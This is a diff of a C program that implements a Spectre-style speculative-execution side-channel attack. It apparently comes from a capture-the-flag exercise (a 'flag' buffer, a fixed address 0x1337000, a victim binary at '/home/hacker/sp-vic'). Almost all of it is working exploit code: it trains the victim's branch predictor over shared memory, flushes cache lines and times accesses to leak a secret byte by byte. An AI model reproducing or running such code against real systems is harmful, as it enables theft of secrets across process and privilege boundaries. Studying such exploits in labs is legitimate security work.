@@ -1,5 +1,3 @@
-// gcc sp-demo.c -lrt -D_GNU_SOURCE -o sp-demo
-#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -13,21 +11,27 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/stat.h>
-#include <pthread.h>
+#include <semaphore.h>
 
 #define CACHE_HIT_THRESHOLD 200
 #define CACHE_LINE_SIZE 0x1000
 #define BUFF_SIZE 255
+char flag[0x100]= {0};
 
-#ifdef __APPLE__
-#define MAP_POPULATE 0
-#endif
+
+void clear_cache(char *ptr)
+{
+    for (int i = 0x4; i < 0x80; i++)
+    {
+        _mm_clflush(ptr + (i+1) * 0x1000);
+    }
+}
 
 char *shared_buffer;
 void pre_work()
 {
-    uint8_t *addr;
-    for(int j = 0; j < BUFF_SIZE; j++){
+    char *addr;
+    for(int j = 1; j < BUFF_SIZE; j++){
         addr = shared_buffer + j * CACHE_LINE_SIZE;
         _mm_clflush(addr);
     }
@@ -35,28 +39,37 @@ void pre_work()
 
 void train_target()
 {
+    sem_t *sem = (sem_t *)shared_buffer;
     for (int i = 0;i < 1000; i++)
     {
-        int mix_i =((i * 167) + 13) & 255;
-        ((volatile int *)shared_buffer)[1] = mix_i % 128;
-        ((volatile int *)shared_buffer)[0] = 1;
+        int mix_i = ((i * 167) + 13) & 255;
+        *(volatile int *)(sem + 1) = mix_i + 257;
+        sem_post(sem);
         sched_yield();
     }
 
-    for (int i = 0; i < 400; i++)
-    {
-        ((volatile int *)shared_buffer)[1] = 0;
-        ((volatile int *)shared_buffer)[0] = 0;
-        sched_yield();
-    }
+    // for (int i = 0; i < 400; i++)
+    // {
+    //     *(volatile int *)(sem + 1) = 0;
+    //     sem_post(sem);
+    //     sched_yield();
+
+    // }
 }
+
 void speculate(int pos)
 {
+    sem_t *sem = (sem_t *)shared_buffer;
+
     for (int i = 0; i < 300; i++)
     {
-        ((volatile int *)shared_buffer)[1] = 128 + pos;
-        ((volatile int *)shared_buffer)[0] = 1;
+        // int mix_i = ((i * 167) + 13) & 255;
+        *(volatile int *)(sem + 1) = pos;// mix_i + 257;
+        sem_post(sem);
+        //*(volatile int *)(sem + 1) = pos;
         sched_yield();
+
+
     }
 }
 
@@ -73,16 +86,17 @@ uint64_t time_access_no_flush(void *p)
 
 bool post_work_inner_work(int mix_i)
 {
-    uint8_t *addr;
+    char *addr;
     size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
     int offset;
     uint64_t t_no_flush;
-    offset = mix_i * CACHE_LINE_SIZE;
+    offset = (mix_i + 1) * CACHE_LINE_SIZE;
     addr = shared_buffer + offset;
     t_no_flush = time_access_no_flush(addr);
+    
     if (mix_i != 0 && mix_i != 255 && t_no_flush <= cache_hit_threshold)
     {
-        printf("cache hit %d timing:%ld\n", mix_i, t_no_flush);
+        printf("cache hit %d timing:%lld\n", mix_i, t_no_flush);
         return true;
     }
     return false;
@@ -90,19 +104,19 @@ bool post_work_inner_work(int mix_i)
 
 uint64_t post_work_inner_work_min(int mix_i)
 {
-    uint8_t *addr;
+    char *addr;
     size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
     int offset;
     uint64_t t_no_flush;
-    offset = mix_i * CACHE_LINE_SIZE;
+    offset = (mix_i) * CACHE_LINE_SIZE;
     addr = shared_buffer + offset;
     return time_access_no_flush(addr);
 }
 
 int post_work(int *stats){
-    for (size_t i = 0x20; i < 255; i++)
+    for (size_t i = 0x4; i < 0x80; i++)
     {
-        int mix_i = ((i * 167) + 13) & 255;
+        int mix_i = i; // ((i * 167) + 13) & 255;
         if (post_work_inner_work(mix_i)) {
             stats[mix_i]++;
         }
@@ -127,7 +141,7 @@ void exploit(int len)
     int stats[256] = {0};
     while(unsolved(results, len))
     {
-        for (int i =0; i < len; i++)
+        for (int i =0; i < len; )
         {
             if (results[i] != '\x00')
                 continue;
@@ -147,66 +161,43 @@ void exploit(int len)
             }
             max_val = 0;
             max_index = 0;
-            for(int j = 0x20; j < 120; j++){
+            for(int j = 0x4; j < 0x80; j++){
                 if(stats[j] > max_val)
                 {
                     max_index = j;
                     max_val = stats[j];
                 }
             }
-            if (max_index != 0&& max_val > 4){
+            if (max_index != 0 && max_val > 1){
                 results[i] = max_index;
                 printf("attempted index %i found %d = %c with %d hits\n", i, max_index, max_index, stats[max_index]);
+                i++;
             }
-            printf("Current results\n");
-            for (int j = 0; j < len; j++)
+            else
             {
-                printf("index: %d value: %c\n", j, results[j]);
+                printf("research\n");
             }
+            // printf("Current results\n");
+            // for (int j = 0; j < len; j++)
+            // {
+            //     printf("index: %d value: %c\n", j, results[j]);
+            // }
+
         }
     }
+
+    for (int i =0; i < len; i++)
+        printf("%c", results[i]);
+
 }
 
-void * attach_to_shared_mem()
-{
-    int ret;
-    int fd = shm_open("/shm_f", O_RDWR | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
-    ret = ftruncate(fd, 0x1000 * 256);
-    char *ptr = (char *)mmap(0, 255 * 0x1000, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
-    close(fd);
-    return ptr;
-}
+char pos[256];
 
-pid_t start_target()
+int main()
 {
-    char *new_argv[] = {"/home/hacker/sp-vic", NULL};
-    pid_t pid = fork();
-    if (!pid){
-        execv(new_argv[0], new_argv);
-        exit(0);
-    }
-    return pid;
-}
-
-void set_affinity()
-{
-    cpu_set_t set;
-    CPU_ZERO(&set);
-    CPU_SET(2, &set);
-    sched_setaffinity(0, sizeof(set), &set);
-}
-
-int main(int argc, char**argv)
-{
-    pid_t pid;
-    set_affinity();
-    shared_buffer = (char *)attach_to_shared_mem();
-    ((int *) shared_buffer)[0] = 0;
-    ((int *) shared_buffer)[1] = 0;
-    ((int *) shared_buffer)[2] = 0;
-    pid = start_target();
-    sched_yield();
-    exploit(5);
-    kill(pid, 5);
+    unsigned long addr = 0x1337000;
+    shared_buffer = (char*)addr;
+    exploit(57);
+    // printf("end\n");
     return 0;
 }
